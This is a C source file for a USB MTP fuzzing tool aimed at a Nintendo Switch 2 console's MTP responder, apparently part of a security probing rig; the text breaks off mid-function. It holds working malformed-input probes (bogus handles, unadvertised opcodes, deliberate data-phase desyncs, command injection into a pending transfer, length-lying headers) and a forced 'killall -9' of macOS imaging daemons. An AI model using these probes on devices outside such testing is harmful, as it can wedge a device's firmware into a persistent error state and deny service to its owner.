/*
 * mtp_probe_libpt2.c — capmtp (Nintendo Switch 2, 057e:2061) MTP prober,
 * TRANSPORT-PARITY build on the libptp2 subset vendored inside libmtp.
 *
 * Why: the python/pyusb prober (mtp_probe.py) reaches the responder's
 * data phase only intermittently, while libmtp (libptp2) succeeds 3/3.
 * The guaranteed-parity exit is to run on the SAME transaction library:
 * this binary links ptp.c + ptp-pack.c + libusb1-glue.c compiled straight
 * from libmtp 1.1.23's source (see build.sh + PROVENANCE.md, LGPL-2.1).
 * Device init replicates LIBMTP_OpenDevice exactly:
 *
 *   LIBMTP_OpenDevice (libmtp.c:1955+): PTPParams zeroed, device_flags=0,
 *     cachetime=2, debug/error funcs, PTP_DL_LE, iconv UTF-16LE<->UTF-8,
 *     then configure_usb_device (libusb1-glue.c:2212) which does
 *     find_interface_and_endpoints -> init_ptp_usb (claims the interface,
 *     wires params->sendreq/senddata/getresp/getdata to the libptp2 USB
 *     I/O callbacks) -> ptp_opensession(params, 1) with libmtp's
 *     tolerance: PTP_ERROR_IO -> usb reset + full re-init + one retry;
 *     PTP_RC_InvalidTransactionID -> transaction_id += 10 + retry;
 *     PTP_RC_SessionAlreadyOpened ACCEPTED and treated as success
 *     (libusb1-glue.c:2330-2352 — the capmtp responder never closes
 *     sessions, so this tolerance is load-bearing). We call the REAL
 *     configure_usb_device() so every byte of that flow is identical.
 *
 * Probe corpus: the same 14 hostile probes + baseline walk as
 * mtp_probe.py (run --list on both to compare). Each probe = fresh
 * connect + OpenSession + hostile op + post-health GetStorageIDs +
 * CloseSession attempt, journaling JSON lines to runs/mtp-libptp-*.jsonl
 * (same runs dir as the rig).
 *
 * macOS Image Capture arbitration: icdd/ptpcamerad/mscamerad-xpc claim
 * PTP interfaces exclusively; they are user-owned, so we killall the
 * trio (from C, between claim retries — same pattern as mtp_probe.py)
 * and the run wrapper does one upfront sweep too.
 *
 * Read-only by design: we never send an object-data phase toward the
 * console; every probe is opcode/parameter abuse of the REQUEST parser.
 *
 * Usage:
 *   mtp_probe_libpt2 --baseline
 *   mtp_probe_libpt2 --list
 *   mtp_probe_libpt2 --probe <name>
 *   mtp_probe_libpt2 --suite
 *   mtp_probe_libpt2 --wait 30 --suite        # race-claim on attach
 *   mtp_probe_libpt2 --self-test
 */
#include <sys/time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <stdarg.h>
#include <time.h>
#include <unistd.h>
#include <iconv.h>

#include "config.h"          /* subset-build defines (HAVE_ICONV etc), so
                              * PTPParams' iconv fields + PTP_CNT_INIT match
                              * what ptp.o/glue.o were compiled with */
#include "ptp.h"
#include "libmtp.h"
#include "libusb-glue.h"

#include <libusb.h>

#define VID 0x057e
#define PID 0x2061

/* opcodes (same set as mtp_probe.py) */
#define OC_GETDEVICEINFO   0x1001
#define OC_OPENSESSION     0x1002
#define OC_CLOSESESSION    0x1003
#define OC_GETSTORAGEIDS   0x1004
#define OC_GETSTORAGEINFO  0x1005
#define OC_GETNUMOBJECTS   0x1006
#define OC_GETHANDLES      0x1007
#define OC_GETOBJECTINFO   0x1008
#define OC_GETOBJECT       0x1009
#define OC_GETTHUMB        0x100a
#define RC_OK              0x2001

/* ------------------------------------------------------------------ */
/* journal: same JSON-lines shape as mtp_probe.py, one file per run     */

static FILE *g_jr = NULL;

static void jr_open(const char *runs_dir)
{
    char path[1024], stamp[32];
    time_t t = time(NULL);
    struct tm tm_utc;
    gmtime_r(&t, &tm_utc);
    strftime(stamp, sizeof(stamp), "%Y%m%dT%H%M%SZ", &tm_utc);
    snprintf(path, sizeof(path), "%s/mtp-libptp-%s.jsonl", runs_dir, stamp);
    if (!(g_jr = fopen(path, "a"))) {
        fprintf(stderr, "cannot open journal %s\n", path);
        exit(2);
    }
    setvbuf(g_jr, NULL, _IOLBF, 0);       /* line-buffered: survives crashes */
    printf("journal: %s\n", path);
}

static void jr(const char *fmt, ...)
{
    va_list ap;
    char ts[16];
    time_t t = time(NULL);
    struct tm tm_l;
    localtime_r(&t, &tm_l);
    strftime(ts, sizeof(ts), "%H:%M:%S", &tm_l);
    if (!g_jr) return;
    va_start(ap, fmt);
    fprintf(g_jr, "{\"ts\":\"%s\",\"", ts);
    vfprintf(g_jr, fmt, ap);
    fprintf(g_jr, "}\n");
    va_end(ap);
    /* console echo, truncated like the python prober */
    va_start(ap, fmt);
    printf("  {\"ts\":\"%s\",\"", ts);
    vprintf(fmt, ap);
    printf("...}\n");
    va_end(ap);
}

static double now_ms(void)
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (double)tv.tv_sec * 1000.0 + (double)tv.tv_usec / 1000.0;
}

/* JSON-escape a short ASCII string (probe names are safe anyway) */
static const char *js(const char *s) { return s ? s : ""; }

/* ------------------------------------------------------------------ */
/* device: exact LIBMTP_OpenDevice flow via the real configure_usb_device */

typedef struct {
    PTPParams params;
    PTP_USB *ptp_usb;                    /* == usbinfo from configure */
    LIBMTP_raw_device_t raw;
    int open;                            /* 1=configured, 2=bare sessionless */
    void *_bare_ctx;                     /* libusb ctx owned by bare_open */
} Dev;

/* kill the macOS Image Capture trio (user-owned daemons) */
static void kill_imaging_trio(void)
{
    (void)system("killall -9 icdd ptpcamerad mscamerad-xpc 2>/dev/null");
}

/* enumerate libusb for the console; fill bus/devnum. 1=found.
 * settle_ms: after libmtp's internal usb_reset the device re-enumerates
 * (possibly at a new address) — retry the enumeration for a grace window. */
static int find_console(libusb_context *ctx, uint8_t *devnum,
                        uint8_t *busnum, int settle_ms)
{
    int waited = 0;
    for (;;) {
        libusb_device **list = NULL;
        ssize_t n = libusb_get_device_list(ctx, &list), i;
        int found = 0;
        for (i = 0; i < n && !found; i++) {
            struct libusb_device_descriptor d;
            if (libusb_get_device_descriptor(list[i], &d) != LIBUSB_SUCCESS)
                continue;
            if (d.idVendor == VID && d.idProduct == PID) {
                *devnum = libusb_get_device_address(list[i]);
                *busnum = libusb_get_bus_number(list[i]);
                found = 1;
            }
        }
        if (n >= 0) libusb_free_device_list(list, 1);
        if (found || waited >= settle_ms) return found;
        usleep(200000);
        waited += 200;
    }
}

/*
 * dev_open: LIBMTP_OpenDevice parity with macOS reality folded in.
 *
 * configure_usb_device's one-shot claim loses the icdd race on macOS
 * (~150ms of enumeration work between our killall and its claim, and the
 * respawned trio re-grabs in that window — python wins only because its
 * killall->claim gap is exactly 120ms). So we mirror libmtp's flow with
 * the claim under OUR control:
 *
 *   1. claim loop: killall trio + 120ms + libusb_open + claim (python
 *      mtp_probe.py _claim parity, fresh handle per attempt).
 *   2. init_ptp_usb parity: PTPParams zeroed (libmtp.c:1955+), the SAME
 *      exported glue I/O callbacks, PTP_DL_LE, iconv UTF-16LE<->UTF-8.
 *   3. the EXACT opensession tolerance block of libusb1-glue.c
 *      configure_usb_device:2308-2352: short USB_START_TIMEOUT (5s) for
 *      the first trial; PTP_ERROR_IO -> libusb_reset_device + full
 *      re-claim + one retry; PTP_RC_InvalidTransactionID ->
 *      transaction_id += 10 + retry; PTP_RC_SessionAlreadyOpened
 *      ACCEPTED; then timeout restored to 20s.
 */
#define USB_START_TIMEOUT_C 5000
#define USB_TIMEOUT_DEFAULT_C 20000

/* one claim attempt: fresh libusb handle + endpoints + interface claim.
 * Returns 0 with d filled (d->open==2, sessionless) or -1 (nothing held).
 * Shared by dev_open and bare_open — same code path, no drift. */
static int open_claimed(Dev *d)
{
    libusb_context *ctx = NULL;
    libusb_device **list = NULL;
    ssize_t n, i;
    libusb_device_handle *h = NULL;
    struct libusb_config_descriptor *cfg = NULL;
    const struct libusb_interface_descriptor *ifc;
    PTPParams *p;
    PTP_USB *u;
    int k, dev_found = 0;

    memset(d, 0, sizeof(*d));
    if (libusb_init(&ctx) != LIBUSB_SUCCESS) return -1;
    d->_bare_ctx = ctx;
    n = libusb_get_device_list(ctx, &list);
    for (i = 0; i < n; i++) {
        struct libusb_device_descriptor dd;
        if (libusb_get_device_descriptor(list[i], &dd) == LIBUSB_SUCCESS &&
            dd.idVendor == VID && dd.idProduct == PID) {
            dev_found = 1;
            if (libusb_open(list[i], &h) == LIBUSB_SUCCESS) break;
        }
    }
    libusb_free_device_list(list, 1);
    if (!dev_found) { jr("open\":\"device not enumerated\""); goto fail; }
    if (!h) { jr("open\":\"libusb_open failed\""); goto fail; }
    if (libusb_get_active_config_descriptor(libusb_get_device(h), &cfg)
        != LIBUSB_SUCCESS) { jr("open\":\"no config descriptor\""); goto fail; }
    ifc = &cfg->interface[0].altsetting[0];
    u = (PTP_USB *)calloc(1, sizeof(PTP_USB));
    u->handle = h;
    u->interface = 0;
    u->timeout = USB_TIMEOUT_DEFAULT_C;
    for (k = 0; k < ifc->bNumEndpoints; k++) {
        const struct libusb_endpoint_descriptor *e = &ifc->endpoint[k];
        int dir = e->bEndpointAddress & 0x80;
        int type = e->bmAttributes & 3;
        if (type == LIBUSB_TRANSFER_TYPE_BULK) {
            if (dir == LIBUSB_ENDPOINT_IN) {
                u->inep = e->bEndpointAddress;
                u->inep_maxpacket = e->wMaxPacketSize;
            } else {
                u->outep = e->bEndpointAddress;
                u->outep_maxpacket = e->wMaxPacketSize;
            }
        }
    }
    libusb_free_config_descriptor(cfg);
    if (!u->inep || !u->outep) { jr("open\":\"no bulk pair\""); free(u); goto fail; }
    if (libusb_claim_interface(h, 0) != LIBUSB_SUCCESS) {
        jr("open\":\"claim failed (trio race)\"");
        free(u);
        goto fail;
    }
    /* == init_ptp_usb parity (libusb1-glue.c:1900+) == */
    p = &d->params;
    memset(p, 0, sizeof(*p));
    p->sendreq_func = ptp_usb_sendreq;     /* exported by glue.o */
    p->senddata_func = ptp_usb_senddata;
    p->getresp_func = ptp_usb_getresp;
    p->getdata_func = ptp_usb_getdata;
    p->cancelreq_func = ptp_usb_control_cancel_request;
    p->devstatreq_func = ptp_usb_control_device_status_request;
    p->data = u;
    p->transaction_id = 0;
    p->byteorder = PTP_DL_LE;
    p->cd_locale_to_ucs2 = iconv_open("UTF-16LE", "UTF-8");
    p->cd_ucs2_to_locale = iconv_open("UTF-8", "UTF-16LE");
    d->ptp_usb = u;
    d->open = 2;                           /* claimed, sessionless */
    return 0;
fail:
    if (h) libusb_close(h);
    libusb_exit(ctx);
    memset(d, 0, sizeof(*d));
    return -1;
}

static void dev_close(Dev *d);

/* libusb1-glue.c:2308-2352 opensession tolerance, verbatim semantics */
static int opensession_with_tolerance(Dev *d)
{
    uint16_t ret;
    PTPParams *p = &d->params;

    d->ptp_usb->timeout = USB_START_TIMEOUT_C;   /* short first-trial timeout */
    ret = ptp_opensession(p, 1);
    if (ret == PTP_ERROR_IO) {
        jr("opensession\":\"PTP_ERROR_IO — reset + re-claim + retry "
           "(libmtp path)\"");
        libusb_reset_device(d->ptp_usb->handle);
        libusb_release_interface(d->ptp_usb->handle, d->ptp_usb->interface);
        libusb_close(d->ptp_usb->handle);
        if (d->_bare_ctx) libusb_exit(d->_bare_ctx);
        if (p->cd_locale_to_ucs2 != (iconv_t)-1)
            iconv_close(p->cd_locale_to_ucs2);
        if (p->cd_ucs2_to_locale != (iconv_t)-1)
            iconv_close(p->cd_ucs2_to_locale);
        {
            int tries;
            for (tries = 0; tries < 8; tries++) {
                kill_imaging_trio();
                usleep(120000);
                if (open_claimed(d) == 0) break;
            }
            if (d->open != 2) {
                jr("opensession\":\"re-claim after reset failed\"");
                return -1;
            }
        }
        /* device reset: wait for re-enumeration before retrying */
        usleep(500000);
        d->ptp_usb->timeout = USB_START_TIMEOUT_C;
        ret = ptp_opensession(p, 1);
        if (ret == PTP_ERROR_IO) {
            jr("opensession\":\"PTP_ERROR_IO on second attempt (libmtp "
               "gives up here)\"");
            return -1;
        }
    }
    if (ret == PTP_RC_InvalidTransactionID) {
        jr("opensession\":\"InvalidTransactionID — +=10 and retry "
           "(libmtp path)\"");
        p->transaction_id += 10;
        ret = ptp_opensession(p, 1);
    }
    if (ret != PTP_RC_SessionAlreadyOpened && ret != PTP_RC_OK) {
        jr("opensession\":\"rejected 0x%04x\"", ret);
        return -1;
    }
    if (ret == PTP_RC_SessionAlreadyOpened)
        jr("opensession\":\"SessionAlreadyOpened tolerated (libmtp parity)");
    d->ptp_usb->timeout = USB_TIMEOUT_DEFAULT_C; /* restore normal timeout */
    return 0;
}

static int dev_open(Dev *d)
{
    int attempt;

    for (attempt = 0; attempt < 8; attempt++) {
        kill_imaging_trio();
        usleep(120000);                    /* python _claim cadence */
        if (open_claimed(d) == 0) {
            jr("stage\":\"dev_open\",\"detail\":\"claim ok\",\"attempt\":%d",
               attempt);
            if (opensession_with_tolerance(d) == 0) {
                d->open = 1;               /* claimed + sessioned */
                return 0;
            }
            /* session failed: release and retry the whole cycle */
            dev_close(d);
            continue;
        }
        jr("stage\":\"dev_open\",\"detail\":\"claim failed\",\"attempt\":%d",
           attempt);
    }
    fprintf(stderr, "dev_open: could not open the device (Image Capture "
            "race? console in Copy-to-Computer mode?)\n");
    return -1;
}

static void dev_close(Dev *d)
{
    if (!d->open) return;
    if (d->open == 2 || d->open == 1) {    /* our own claim in both cases */
        libusb_release_interface(d->ptp_usb->handle, d->ptp_usb->interface);
        libusb_close(d->ptp_usb->handle);
        if (d->_bare_ctx) libusb_exit(d->_bare_ctx);
        if (d->params.cd_locale_to_ucs2 != (iconv_t)-1)
            iconv_close(d->params.cd_locale_to_ucs2);
        if (d->params.cd_ucs2_to_locale != (iconv_t)-1)
            iconv_close(d->params.cd_ucs2_to_locale);
        memset(d, 0, sizeof(*d));
        return;
    }
    close_device(d->ptp_usb, &d->params);   /* legacy configure path */
    if (d->params.cd_locale_to_ucs2 != (iconv_t)-1)
        iconv_close(d->params.cd_locale_to_ucs2);
    if (d->params.cd_ucs2_to_locale != (iconv_t)-1)
        iconv_close(d->params.cd_ucs2_to_locale);
    memset(d, 0, sizeof(*d));
}

/* ------------------------------------------------------------------ */
/* xfer: one ptp_transaction with journaling (python xfer() parity).
 * PTP_CNT_INIT is private to ptp.c; equivalent init inline.            */

static uint16_t xfer(Dev *d, const char *name, uint16_t code,
                     int nparam, const uint32_t *pv, int expect_data)
{
    PTPContainer ptp;
    unsigned char *data = NULL;
    unsigned int recvlen = 0;
    uint16_t ret;
    double t0 = now_ms();

    memset(&ptp, 0, sizeof(ptp));
    ptp.Code = code;
    ptp.Nparam = nparam;
    if (nparam > 0) ptp.Param1 = pv[0];
    if (nparam > 1) ptp.Param2 = pv[1];
    if (nparam > 2) ptp.Param3 = pv[2];
    if (nparam > 3) ptp.Param4 = pv[3];
    if (nparam > 4) ptp.Param5 = pv[4];

    ret = ptp_transaction(&d->params, &ptp,
                          expect_data ? PTP_DP_GETDATA : PTP_DP_NODATA,
                          0, expect_data ? &data : NULL,
                          expect_data ? &recvlen : NULL);
    jr("op\":\"%s\",\"code\":\"0x%04x\",\"txid\":%u,"
       "\"resp_code\":\"0x%04x\",\"data_len\":%u,\"ms\":%.2f",
       js(name), code,
       (unsigned)(d->params.transaction_id ? d->params.transaction_id - 1 : 0),
       ret, expect_data ? recvlen : 0, now_ms() - t0);
    if (data) free(data);
    return ret;
}

/* python session()/end() parity (session itself already lives inside
 * configure_usb_device — this is the PROBE-side explicit re-open) */
static uint16_t session_op(Dev *d)
{
    /* mirror libmtp: if the responder says AlreadyOpen, ACCEPT */
    uint32_t p = 1;
    uint16_t rc = xfer(d, "OpenSession", OC_OPENSESSION, 1, &p, 0);
    if (rc == PTP_RC_SessionAlreadyOpened) {
        jr("op\":\"OpenSession\",\"detail\":\"SessionAlreadyOpened "
           "tolerated (libmtp parity)\"");
        return PTP_RC_OK;
    }
    return rc;
}

static uint16_t end(Dev *d)
{
    uint32_t p = 1;
    return xfer(d, "CloseSession", OC_CLOSESESSION, 1, &p, 0);
}

/* ------------------------------------------------------------------ */
/* baseline walk (python baseline() parity, via libptp2 helpers)        */

static void baseline(Dev *d)
{
    uint16_t rc;
    /* GetDeviceInfo is part of LIBMTP_OpenDevice; journal it explicitly */
    PTPDeviceInfo di;
    double t0 = now_ms();
    rc = ptp_getdeviceinfo(&d->params, &di);
    jr("op\":\"GetDeviceInfo\",\"code\":\"0x1001\",\"txid\":%u,"
       "\"resp_code\":\"0x%04x\",\"ms\":%.2f",
       (unsigned)(d->params.transaction_id - 1), rc, now_ms() - t0);

    {
        PTPStorageIDs sids;
        uint32_t i;
        rc = ptp_getstorageids(&d->params, &sids);
        jr("op\":\"GetStorageIDs\",\"code\":\"0x1004\","
           "\"resp_code\":\"0x%04x\",\"storage_count\":%u",
           rc, rc == RC_OK ? sids.n : 0);
        if (rc != RC_OK) { (void)end(d); return; }
        for (i = 0; i < sids.n && i < 4; i++) {
            PTPStorageInfo si;
            char namebuf[64];
            rc = ptp_getstorageinfo(&d->params, sids.Storage[i], &si);
            snprintf(namebuf, sizeof(namebuf), "GetStorageInfo[%u]",
                     sids.Storage[i]);
            jr("op\":\"%s\",\"code\":\"0x1005\",\"resp_code\":\"0x%04x\"",
               namebuf, rc);
            /* GetNumObjects (0x1006) is broken/unimplemented on capmtp —
             * returns custom 0x02FE AND poisons the next transaction.
             * mtp-files parity: go straight to GetObjectHandles, parsed. */
            {
                PTPObjectHandles oh;
                uint32_t k;
                rc = ptp_getobjecthandles(&d->params,
                                          0xFFFFFFFFu,  /* ALL storages —
                     capmtp rejects the concrete ids it itself reports */
                                          0, 0xFFFFFFFFu, &oh);  /* assoc = ROOT_PARENT */
                jr("op\":\"GetObjectHandles\",\"code\":\"0x1007\","
                   "\"resp_code\":\"0x%04x\",\"handle_count\":%u", rc,
                   rc == RC_OK ? oh.n : 0);
                for (k = 0; k < oh.n && k < 5; k++)
                    jr("\"handle[%u]\":%u", k, oh.Handler[k]);
                if (rc == RC_OK && oh.n)
                    free(oh.Handler);
            }
        }
        free(sids.Storage);
    }
    (void)end(d);
}

/* ------------------------------------------------------------------ */
/* hostile corpus — SAME 14 probes as mtp_probe.py                      */

typedef uint16_t (*probe_fn)(Dev *d);

typedef struct { const char *name; probe_fn fn; } probe_t;
static probe_t PROBES[32];
static int n_probes = 0;
static void reg(const char *name, probe_fn fn)
{
    PROBES[n_probes].name = name;
    PROBES[n_probes].fn = fn;
    n_probes++;
}

static uint16_t p_h0(Dev *d)
{ return xfer(d, "GetObjectInfo(h=0)", OC_GETOBJECTINFO, 1,
              (const uint32_t[]){0}, 1); }
static uint16_t p_hmax(Dev *d)
{ return xfer(d, "GetObjectInfo(h=max)", OC_GETOBJECTINFO, 1,
              (const uint32_t[]){0xFFFFFFFFu}, 1); }
static uint16_t p_hwrap(Dev *d)
{ return xfer(d, "GetObjectInfo(h=0x80000000)", OC_GETOBJECTINFO, 1,
              (const uint32_t[]){0x80000000u}, 1); }
static uint16_t p_badstore(Dev *d)
{ return xfer(d, "GetNumObjects(store=bad)", OC_GETNUMOBJECTS, 3,
              (const uint32_t[]){0xdeadbeefu, 0, 0}, 1); }
static uint16_t p_badfmt(Dev *d)
{ return xfer(d, "GetNumObjects(fmt=max)", OC_GETNUMOBJECTS, 3,
              (const uint32_t[]){0x00030001u, 0xFFFFu, 0}, 1); }
static uint16_t p_badassoc(Dev *d)
{ return xfer(d, "GetObjectHandles(assoc=max)", OC_GETHANDLES, 3,
              (const uint32_t[]){0x00030001u, 0, 0xFFFFFFFFu}, 1); }

/*
 * getobject_partial_nodata: request a data-phase op WITHOUT consuming the
 * data, then immediately CloseSession (forces data-phase state desync).
 * ptp_transaction would consume; use the raw libptp2 callbacks directly
 * (sendreq_func/getresp_func are the same function pointers libmtp wires).
 */
static uint16_t p_getobj_nodata(Dev *d)
{
    PTPContainer ptp;
    uint16_t r1, r2;
    PTPParams *p = &d->params;

    memset(&ptp, 0, sizeof(ptp));
    ptp.Code = OC_GETOBJECT;
    ptp.Nparam = 1;
    ptp.Param1 = 1;
    ptp.Transaction_ID = p->transaction_id++;
    r1 = p->sendreq_func(p, &ptp, PTP_DP_GETDATA);
    jr("op\":\"GetObject(h=1) RAW-NODATA\",\"code\":\"0x1009\","
       "\"txid\":%u,\"resp_code\":\"0x%04x\",\"detail\":\"request sent, "
       "data phase deliberately not consumed\"",
       (unsigned)ptp.Transaction_ID, r1);
    /* do NOT read the data phase: straight to CloseSession */
    memset(&ptp, 0, sizeof(ptp));
    ptp.Code = OC_CLOSESESSION;
    ptp.Nparam = 1;
    ptp.Param1 = 1;
    ptp.Transaction_ID = p->transaction_id++;
    r2 = p->sendreq_func(p, &ptp, PTP_DP_NODATA);
    if (r2 == PTP_RC_OK) {
        PTPContainer resp;
        memset(&resp, 0, sizeof(resp));
        resp.Code = OC_CLOSESESSION;
        r2 = p->getresp_func(p, &resp);
        jr("op\":\"CloseSession-after-data\",\"code\":\"0x1003\","
           "\"resp_code\":\"0x%04x\"", r2);
    } else {
        jr("op\":\"CloseSession-after-data\",\"code\":\"0x1003\","
           "\"resp_code\":\"0x%04x\",\"detail\":\"sendreq failed\"", r2);
    }
    return r2;
}

static uint16_t p_thumb(Dev *d)
{ return xfer(d, "GetThumb(h=max)", OC_GETTHUMB, 1,
              (const uint32_t[]){0xFFFFFFFFu}, 1); }
static uint16_t p_unk1(Dev *d)
{ return xfer(d, "GetPartialObject(unadv)", 0x100b, 3,
              (const uint32_t[]){1, 0, 0xFFFFFFFFu}, 1); }
static uint16_t p_unk2(Dev *d)
{ return xfer(d, "op100c(unadv)", 0x100c, 1,
              (const uint32_t[]){1}, 1); }
static uint16_t p_unk3(Dev *d)
{ return xfer(d, "op9801(GetObjectProps unadv)", 0x9801, 3,
              (const uint32_t[]){0xFFFFFFFFu, 0xFFFFFFFFu, 0xFFFFFFFFu}, 1); }
static uint16_t p_sendobj(Dev *d)
{ return xfer(d, "SendObject(unadv)", 0x100d, 0, NULL, 0); }
static uint16_t p_reopen(Dev *d)
{
    uint32_t one = 1, big = 0x7FFFFFFFu;
    (void)xfer(d, "OpenSession(1) again", OC_OPENSESSION, 1, &one, 0);
    return xfer(d, "OpenSession(max)", OC_OPENSESSION, 1, &big, 0);
}
static uint16_t p_untidy(Dev *d)
{ return xfer(d, "CloseSession(tid=bad)", OC_CLOSESESSION, 1,
              (const uint32_t[]){0xdeadbeefu}, 0); }

/* ------------------------------------------------------------------ */
/* corpus v2 — escalation round (2026-11-11 live findings): the         */
/* data-phase desync leaves a PERSISTENT 0x02FF (PTP_ERROR_IO) zombie   */
/* that survives reconnects; recovery so far only console-side.         */

/* raw bulk I/O on the same endpoints the glue callbacks use */
static int raw_bulk_read(Dev *d, void *buf, int len, int timeout_ms)
{
    int xfr = 0;
    int rc = libusb_bulk_transfer(d->ptp_usb->handle, d->ptp_usb->inep,
                                  (unsigned char *)buf, len, &xfr,
                                  timeout_ms);
    jr("raw_read\":\"%d bytes / rc %d%s\"", xfr, rc,
       rc == LIBUSB_ERROR_TIMEOUT ? " (timeout)" : "");
    return (rc == LIBUSB_SUCCESS) ? xfr : -1;
}

static int raw_bulk_write(Dev *d, const void *buf, int len)
{
    int xfr = 0;
    int rc = libusb_bulk_transfer(d->ptp_usb->handle, d->ptp_usb->outep,
                                  (unsigned char *)buf, len, &xfr, 5000);
    return (rc == LIBUSB_SUCCESS && xfr == len) ? 0 : -1;
}

/* journal a raw buffer as hex (max 64 bytes) — byte-level provenance for
 * every container the wire actually delivered (v5) */
static void jhex(const char *tag, const unsigned char *p, int n)
{
    char hex[2 * 64 + 1];
    int i;
    if (n < 0) n = 0;
    if (n > 64) n = 64;
    for (i = 0; i < n; i++)
        snprintf(hex + 2 * i, 3, "%02x", p[i]);
    hex[2 * n] = 0;
    jr("%s_hex\":\"%s\"", tag, hex);
}

/* send a request container WITHOUT any transaction machinery */
static uint16_t raw_sendreq(Dev *d, const char *tag, uint16_t code,
                            int nparam, const uint32_t *pv, int dataphase)
{
    PTPContainer ptp;
    uint16_t rc;
    memset(&ptp, 0, sizeof(ptp));
    ptp.Code = code;
    ptp.Nparam = nparam;
    if (nparam > 0) ptp.Param1 = pv[0];
    if (nparam > 1) ptp.Param2 = pv[1];
    if (nparam > 2) ptp.Param3 = pv[2];
    ptp.Transaction_ID = d->params.transaction_id++;
    rc = d->params.sendreq_func(&d->params, &ptp, dataphase);
    jr("op\":\"%s\",\"code\":\"0x%04x\",\"txid\":%u,\"resp_code\":\"0x%04x\"",
       tag, code, (unsigned)ptp.Transaction_ID, rc);
    return rc;
}

/* the desync core: GetObject request whose data phase is never consumed */
static uint16_t desync_getobject(Dev *d, const char *tag, uint32_t handle)
{
    uint32_t p = handle;
    return raw_sendreq(d, tag, OC_GETOBJECT, 1, &p, PTP_DP_GETDATA);
}

/*
 * v2-1 midstream_inject: begin GetObject(h) for a REAL handle, consume
 * ONLY the 12-byte DATA container header, then immediately write a second
 * command container (GetStorageIDs) INTO the pending data phase.
 */
static uint16_t p_midstream(Dev *d)
{
    unsigned char data_hdr[12];
    uint32_t handles[256];
    unsigned int recvlen = 0, n = 0, i;
    unsigned char *data = NULL;
    uint16_t rc;
    PTPContainer ptp;
    double t0;

    /* get a real handle first (album may be empty -> clean skip) */
    memset(&ptp, 0, sizeof(ptp));
    ptp.Code = OC_GETHANDLES;
    ptp.Nparam = 3;
    ptp.Param1 = 0; ptp.Param2 = 0; ptp.Param3 = 0xFFFFFFFFu;
    rc = ptp_transaction(&d->params, &ptp, PTP_DP_GETDATA, 0, &data,
                         &recvlen);
    if (rc != RC_OK || recvlen < 4 || !data) {
        jr("op\":\"GetObjectHandles(real)\",\"resp_code\":\"0x%04x\","
           "\"detail\":\"handles unavailable\"", rc);
        jr("probe\":\"midstream_inject\",\"SKIP\":\"no-objects\"");
        return rc ? rc : PTP_RC_GeneralError;
    }
    n = ((uint32_t *)data)[0];
    if (n > 255) n = 255;
    for (i = 0; i < n; i++) handles[i] = ((uint32_t *)data)[1 + i];
    free(data);
    if (n == 0) {
        jr("probe\":\"midstream_inject\",\"SKIP\":\"no-objects\","
           "\"detail\":\"album empty\"");
        return RC_OK;
    }
    jr("op\":\"GetObjectHandles(real)\",\"resp_code\":\"0x%04x\","
       "\"handles\":%u,\"first\":\"0x%08x\"", rc, n, handles[0]);

    /* begin GetObject(h) and consume ONLY the 12-byte DATA header */
    (void)desync_getobject(d, "GetObject(real) begin", handles[0]);
    t0 = now_ms();
    {
        int got = raw_bulk_read(d, data_hdr, 12, 5000);
        if (got >= 12) {
            jr("op\":\"consume-data-header\",\"data_len_field\":\"0x%x\","
               "\"type\":\"0x%04x\",\"code\":\"0x%04x\",\"ms\":%.2f",
               ((uint32_t *)data_hdr)[0], ((uint16_t *)data_hdr)[2],
               ((uint16_t *)data_hdr)[3], now_ms() - t0);
        } else {
            jr("op\":\"consume-data-header\",\"detail\":\"no 12-byte "
               "header read\",\"ms\":%.2f", now_ms() - t0);
            /* nothing consumed: still inject; the violation stands */
        }
    }

    /* the violation: a second COMMAND container into the data phase */
    t0 = now_ms();
    (void)raw_sendreq(d, "GetStorageIDs INJECTED into data phase",
                      OC_GETSTORAGEIDS, 0, NULL, PTP_DP_NODATA);
    /* then try to read what comes back */
    {
        unsigned char buf[64];
        int got = raw_bulk_read(d, buf, sizeof(buf), 5000);
        if (got >= 12) {
            jr("op\":\"post-inject-read\",\"len_field\":\"0x%x\","
               "\"type\":\"0x%04x\",\"code\":\"0x%04x\",\"ms\":%.2f",
               ((uint32_t *)buf)[0], ((uint16_t *)buf)[2],
               ((uint16_t *)buf)[3], now_ms() - t0);
        } else {
            jr("op\":\"post-inject-read\",\"detail\":\"nothing readable\","
               "\"ms\":%.2f", now_ms() - t0);
        }
    }
    return RC_OK;
}

/*
 * v2-2 double_desync: one desync, 1s pause, then a FULL command sequence
 * on the SAME connection (OpenSession + GetStorageIDs + a second desync).
 * Fixed-size pending-transaction tables may collide/overflow.
 */
static uint16_t p_double_desync(Dev *d)
{
    uint32_t one = 1;
    (void)desync_getobject(d, "GetObject desync #1", 1);
    jr("op\":\"double-desync\",\"detail\":\"waiting 1s with pending data "
       "phase\"");
    sleep(1);
    (void)xfer(d, "OpenSession (after desync#1)", OC_OPENSESSION, 1, &one, 0);
    (void)xfer(d, "GetStorageIDs (after desync#1)", OC_GETSTORAGEIDS, 0,
               NULL, 1);
    (void)desync_getobject(d, "GetObject desync #2", 1);
    (void)xfer(d, "GetStorageIDs (after desync#2)", OC_GETSTORAGEIDS, 0,
               NULL, 1);
    jr("op\":\"double-desync\",\"detail\":\"sequence complete on one "
       "connection\"");
    return RC_OK;
}

/*
 * v2-3 length_lie_cmd: command containers whose length header lies
 * (0xFFFFFFFF, then 0) around a valid GetStorageIDs body.
 * Layout: u32 len | u16 type(1=CMD) | u16 code | u32 txid => 12 bytes.
 */
static uint16_t send_liar(Dev *d, uint32_t lie, const char *tag)
{
    unsigned char c[12];
    uint32_t tx = d->params.transaction_id++;
    unsigned char rbuf[64];
    double t0 = now_ms();
    ((uint32_t *)c)[0] = lie;
    ((uint16_t *)c)[2] = 1;               /* container type: COMMAND */
    ((uint16_t *)c)[3] = OC_GETSTORAGEIDS;
    ((uint32_t *)c)[2] = tx;              /* trans_id at offset 8 */
    if (raw_bulk_write(d, c, 12) == 0) {
        int got = raw_bulk_read(d, rbuf, sizeof(rbuf), 5000);
        jr("op\":\"%s\",\"len_field\":\"0x%x\",\"read\":%d,\"ms\":%.2f",
           tag, lie, got, now_ms() - t0);
        if (got >= 12)
            jr("op\":\"%s-resp\",\"len_field\":\"0x%x\",\"type\":\"0x%04x\","
               "\"code\":\"0x%04x\"", tag, ((uint32_t *)rbuf)[0],
               ((uint16_t *)rbuf)[2], ((uint16_t *)rbuf)[3]);
    } else {
        jr("op\":\"%s\",\"detail\":\"write failed\"", tag);
    }
    return RC_OK;
}

static uint16_t p_length_lie(Dev *d)
{
